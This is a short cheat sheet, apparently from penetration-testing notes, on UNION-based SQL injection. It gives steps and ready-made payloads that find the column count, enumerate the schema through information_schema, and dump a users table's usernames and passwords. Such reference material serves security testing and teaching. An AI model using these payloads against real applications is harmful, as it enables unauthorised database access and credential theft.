# 05.05 UNION-based Extraction

> Match column count, swap NULLs for `version(),user(),database()`, then walk `information_schema.tables` to dump everything.

## Overview

Once column count matches, replace NULLs with `version(),user(),database()`. Then enumerate tables via `information_schema.tables`, columns, then dump.

## Steps

- **Find column count** — `' ORDER BY 1-- -` increasing until error.
- **Identify visible columns** — `' UNION SELECT 1,2,3-- -` see which numbers print.
- **Enumerate schema** — `information_schema.tables/columns`.
- **Dump rows** — concat columns for readability: `CONCAT_WS('|',col1,col2)`.

## Commands

### Discovery + dump

```sql
' ORDER BY 5-- -                                                  # 4 OK, 5 errors → 4 cols
' UNION SELECT 1,2,3,4-- -                                        # see which print
' UNION SELECT 1,database(),user(),version()-- -
' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,CONCAT_WS('|',username,password),3,4 FROM users-- -
```
